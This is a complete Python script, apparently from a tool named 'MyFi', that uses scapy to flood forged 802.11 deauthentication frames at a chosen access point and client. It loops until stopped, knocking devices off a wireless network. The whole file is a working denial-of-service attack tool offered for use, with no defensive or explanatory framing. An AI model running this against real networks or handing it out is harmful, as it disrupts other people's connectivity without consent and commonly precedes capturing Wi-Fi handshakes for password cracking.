#!/usr/bin/env python
import argparse, sys
from scapy.all import *

class colors:
    purple = '\033[95m'
    blue = '\033[94m'
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'
    bold = '\033[1m'
    underline = '\033[4m'
    error = red + "[-]" + end
    success = green + "[+]" + end

def cli():
	parser = argparse.ArgumentParser()
	parser.add_argument('-b', '--bssid', help="BSSID of target network.")
	parser.add_argument('-i', '--interface', help="Interface to use (must be in monitor mode)")
	parser.add_argument('-c', '--client', help="The MAC address of the target client.")
	args = parser.parse_args()
	if args.bssid == False or args.bssid == None or args.interface == False or args.interface == None:
		os.system("python {} -h".format(sys.argv[0]))
		quit()
	if args.client == None or args.client == False:
		args.client = args.bssid
	return args

def attack(bssid, client, interface):
	conf.iface = interface
	conf.verb = 0
	sent = 0
	try:
		print(colors.success + " Attack started. Hit CTRL + C to end it.")
		while 1:
			pkt = Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
			sendp(pkt)
			sent += 1
			sys.stdout.write('\r{0} {1} De-auth packets has been sent!'.format(colors.success, sent))
			sys.stdout.flush()
	except KeyboardInterrupt:
		print(colors.blue + "\nThanks for using MyFi, exiting." + colors.end)
		quit()
	except Exception as e:
		print colors.error + " \nAn error has occured: {}".format(e) + colors.end


args = cli()
attack(args.bssid, args.client, args.interface)
